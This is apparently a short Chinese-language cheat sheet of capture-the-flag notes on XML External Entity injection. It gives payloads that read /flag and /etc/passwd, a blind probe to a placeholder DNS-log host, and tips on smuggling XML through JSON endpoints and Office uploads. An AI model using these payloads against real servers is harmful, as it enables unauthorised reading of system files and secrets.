

```sh
#XXE (XML外部实体注入) 
漏洞原理:未禁用外部实体,可通过构造恶意payload,读取服务器文件:
=================================
#可能性判定
F12查看,post表单提交的数据是一个xml结构

#服务器解析 XML 时会读取 /flag 文件内容并将其替换到 &admin :
?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY admin SYSTEM "file:///flag">		#可先测试读:<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <username>&admin;</username>
    <password>123456</password>
</root>
==================================

#隐藏的 XML： 
有些接口表面上看是 JSON 交互，但如果你修改 Content-Type 为 application/xml 并发送 XML 数据，后端如果切换了解析引擎，漏洞就出来了

#Office/PDF 文件： 
.docx、.xlsx 本质上是压缩后的 XML。通过上传恶意的 Office 文档，依然可以触发后端服务器的 XXE
==================================

#判定方式:
看数据包里有没有 XML 结构（通常 Content-Type 是 text/xml 或 application/xml）

1. 回显判定（有回显）,尝试简单实体测试:
<!DOCTYPE test [ <!ENTITY name "CheckOK"> ]>	#注意,节点名称test,以数据包xml里的为准
<test>&name;</test>

2. 带外探测（无回显 / Blind XXE）
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://你的dnslog地址"> ]>
<test>&xxe;</test>
=================================

#说明
此类漏洞已比较少见,默认服务端都开启防御
```

